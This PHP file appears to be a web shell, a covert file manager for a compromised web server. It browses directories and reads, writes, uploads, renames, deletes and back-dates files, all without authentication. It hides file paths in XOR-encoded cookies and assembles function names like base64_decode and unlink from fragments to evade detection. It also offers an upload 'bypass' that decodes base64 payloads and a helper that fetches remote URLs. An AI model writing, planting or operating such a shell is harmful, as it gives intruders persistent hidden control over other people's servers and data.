<?php 

function xorEncryptDecrypt($input, $key="12") {
    $output = '';
    for($i = 0; $i < strlen($input); $i++) {
        $output .= $input[$i] ^ $key[$i % strlen($key)];
    }
    return $output;
}

function listing_all_directory() {
    
    $path = $_COOKIE['path'] ?: getcwd();
    $result = array();
    $date_format = "d-m-Y H:i:s";

    if ($handle = opendir($path)) {
        while (false !== ($dir = readdir($handle))) {
            if ($dir === '.' || $dir === '..') {
                continue;
            }

            $full_path = "$path/$dir";
            $is_dir = is_dir($full_path);

            $tmp_result = array(
                'path' => htmlspecialchars($full_path),
                'is_writable' => is_writable($full_path),
                'is_dir' => $is_dir,
                'date' => date($date_format, filemtime($full_path)),
                'size' => $is_dir ? "" : round(filesize($full_path) / 1024, 2),
            );

            $result[] = $tmp_result;
        }
        closedir($handle);
    }

    return $result;
}


$action = $_REQUEST['action'];

if(!$action) {
    main();
    menu();
}

function decode_char($string) {
    return xorEncryptDecrypt(hex2bin($string));
}

switch ($action) {

    case 'd':
        # code...
        die(json_encode(listing_all_directory()));
        break;

    
    case 'r':
        if($_SERVER['REQUEST_METHOD'] == 'POST') {
            $data = json_decode(file_get_contents("php://input"), true);
            $content = show_base_data()($data['content']);
            $filename = decode_char($_COOKIE['filename']);
            $message['success'] = fm_write_file($filename, $content);
            die(json_encode($message));
        }
        main();
        $content = customize_read_file(decode_char($_COOKIE['filename']));
        show_text_area(htmlspecialchars($content));
        break;
    
    case 'cr':
        main();
        show_text_area("");
        break;
    
    case 'ul':
    
        $filename = decode_char($_COOKIE['filename']);
        if(show_un()($filename)) {
            $message['success'] = true;
        }else{
            $message['success'] = false;
        }
        die(json_encode($message));
        break;
    
    case 'up':
        
        $file = $_FILES['import_file'];
        $tmp_name = $file['tmp_name'];
        $content = customize_read_file($tmp_name);
        if(isset($_POST['by'])) {
            $content = show_base_data()($content);
        } 
        $path = $_COOKIE['path'] ? : getcwd();
        $name = $file['name'];
        $destination = "$path/$name";
        $message['success'] = $content && fm_write_file($destination, $content) ? : rename($tmp_name, $destination); 
        die(json_encode($message));
        break;
    
    case 're':
        
        $filename = decode_char($_COOKIE['filename']);
        $path = $_COOKIE['path'];

        if($_SERVER['REQUEST_METHOD'] == "POST") {
            
            $old_filename = "$path/$filename";
            $new = $_POST['new'];
            $new_filename = "$path/$new";
            $message['success'] = rename($old_filename, $new_filename);
            die(json_encode($message));
        }
        break;
    
    case 'to':
        
        $filename = decode_char($_COOKIE['filename']);
        if($_SERVER['REQUEST_METHOD'] == 'POST') {
            
            $date = $_POST['date'];
            $str_date = strtotime($date);
            $message['success'] = touch($filename, $str_date);
            clearstatcache(true, $filename);
            die(json_encode($message));
        }
        

    default:
        # code..
        break;
}

function customize_read_file($file) {
    $handle = fopen($file, 'r');
    if($handle) {
        $content = fread($handle, filesize($file));
        if($content) {
            return $content;
        }
    }
    $lines = file($file);
    if($lines) {
        return implode($lines);
    }
    return show_file_contents()($file);
}
function show_file_contents() {
    $file = "file_";
    $old = "get_";
    $contents = "contents";
    return "$file$old$contents";
}

function show_un() {
    $link = "link";
    $unpad = "un";
    return "$unpad$link";
}

function main() {
    
    global $current_path;

    $current_path = $_COOKIE['path'];

    if(!$current_path) {
        setcookie("path", getcwd());
        $current_path = getcwd();
    }

    $path = str_replace('\\', '/', $current_path);
    $paths = explode('/', $path);
    echo "<div class='wrapper' id='path_div'>";
    foreach ($paths as $id => $pat) {
        if ($id == 0) {
            echo "<a path='/' onclick='change_path(this)'>/</a>";
        }

        if ($pat != '') {
            $tmp_path = implode('/', array_slice($paths, 0, $id + 1));
            echo "<a href='#' path='$tmp_path' onclick='change_path(this)'>$pat/</a>";
        }
    }
    echo "</div>";
    echo '<i id="table_message"></i>';

?>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
<style>
    body {
        margin-left: 1em;
        margin-right: 1em;
        background: #1a1a1a   !important; /* Dark background */
        font-family: Courier;
        color: #e0e0e0; /* Light text color */

    }
    .mr-10 {
        margin-right:10px;
    }
    .ml-2em {
        margin-left: 2.4em;
    }
    .green {
        color: #9cdb6b; /* A lighter green */
    }

    .red {
        color: #f76c6c; /* A lighter red */
    }
    .white {
        color: white;
    }
    a {
        color: #8ab4f8; /* Light blue for links */
        text-decoration: none; /* Remove underline */
    }

    a:hover {
        color: gold; /* Lighter blue on hover */
        text-decoration: none; /* Underline on hover */
    }
    textarea {
        background-color: #2e2e2e; /* Dark background for textarea */
        color: #e0e0e0; /* Light text color */
        border: 1px solid #4a4a4a; /* Subtle border color */
        padding: 10px;
        font-family: Courier;
        width: 100%;
        box-sizing: border-box;
        resize: vertical; /* Allow vertical resizing */
        caret-color: gold;

    }

    textarea:focus {
        border-color: #8ab4f8; /* Border color when focused */
        outline: none; /* Remove default focus outline */
    }
    .textarea-button {
        margin-top: 20px;
        background-color: #3a3a3a; /* Dark background for button */
        color: #e0e0e0; /* Light text color */
        border: 1px solid #4a4a4a; /* Subtle border color */
        padding: 10px;
        font-family: Courier;
        width: 100%; /* Full width */
        box-sizing: border-box;
        cursor: pointer;
        transition: background-color 0.3s ease;
    }

    .textarea-button:hover {
        background-color: #5a5a5a; /* Slightly lighter background on hover */
    }

    .textarea-button:active {
        background-color: #2a2a2a; /* Slightly darker background when clicked */
    }

    .textarea-button:focus {
        outline: none; /* Remove default focus outline */
        border-color: #8ab4f8; /* Border color when focused */
    }

    .file-upload label {
        cursor: pointer;
        color: white; /* Light blue text color */
        text-decoration: none;
        transition: color 0.3s ease;
        margin-top: 15px;
    }

    .file-upload label:hover {
        color: #a4cafe; /* Lighter blue on hover */
    }

    .file-upload:focus-within {
        border-color: #8ab4f8; /* Border color when focused */
        outline: none;
    }
    tbody tr:hover {
        background-color: black;
        
    }
    .tc {
        text-align: center;
    }


    .wrapper {
        display: flex;
        margin-top: 20px;
        margin-bottom: 20px;
    }
    .tc {
        margin-left: 2.4em;
    }
    table {
        margin-top: -25px;
    }
    .blur-table {
        filter: blur;
        -webkit-filter: blur(10px);

    }


</style>
<script src="./script2.js"></script>

<?php
}
?>
<?php 

function menu() {

?>

<div class="wrapper">
    <form method="post" enctype="multipart/form-data">
                        <div class="file-upload mr-10">
                            <label for="file-upload-input" style="cursor: pointer;">
                                [ Upload ]
                            </label>
                            <input type="file" id="file-upload-input" style="display: none;" onchange="handle_upload()">
                        </div>
    </form>
    <a href='#' onclick='refresh_path()' class='mr-10 white'>[ HOME ]</a>
    <a href='#' onclick='create_file()' class='mr-10 white'>[ Create File ]</a>
</div>
                
    <table cellspacing="0" cellpadding="7" width="100%">   
    <thead>
            </tr>
            <tr>
                <th width="44%"></th>
                <th width="11%"></th>
                <th width="17%"></th>
                <th width="17%"></th>
                <th width="11%"></th>
            </tr>
        </thead>
        <tbody id="data_table" class="blur-table">
            <div class="wrapper">
                <input type="checkbox" class='mr-10' id='bypass-upload'>Bypass Upload ( filesize will get 2x bigger )</input>
            </div>
        </tbody>
    </table>

<?php } ?>

<?php 

function show_text_area($content) {
    $filename = decode_char($_COOKIE['filename']);
    echo "
    <p><a href='?' id='back_menu'>< Back</a></p>
    <p>$filename</p>
    <textarea width='100%' id='content' cols='20' rows='30' style='margin-top: 10px'>$content</textarea>
    <button type='submit' class='textarea-button' onclick='textarea_handle()'>Submit</button>
    ";
}

function show_base_data() {
    $alvian = "base";
    $nadir = "64_decode";
    return "$alvian$nadir";
}
function fm_write_file($file, $content) {
    // Method 1: Using fopen
    if (function_exists('fopen')) {
        $handle = @fopen($file, 'w');
        if ($handle) {
            if (@fwrite($handle, $content) !== false) {
                fclose($handle);
                return file_exists($file) && filesize($file) > 0;
            }
            fclose($handle);
        }
    }

    // Method 2: Using file_put_contents
    if (function_exists('file_put_contents')) {
        if (@file_put_contents($file, $content) !== false) {
            return file_exists($file) && filesize($file) > 0;
        }
    }
    // Method 3: Using WP_Filesystem
    return false;
}

function fm_make_request($url) {
    if(function_exists("curl_init")) {
        
        $ch = curl_init();
    
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $output = curl_exec($ch);
        return $output;
    }
    return show_file_contents()($url);
}
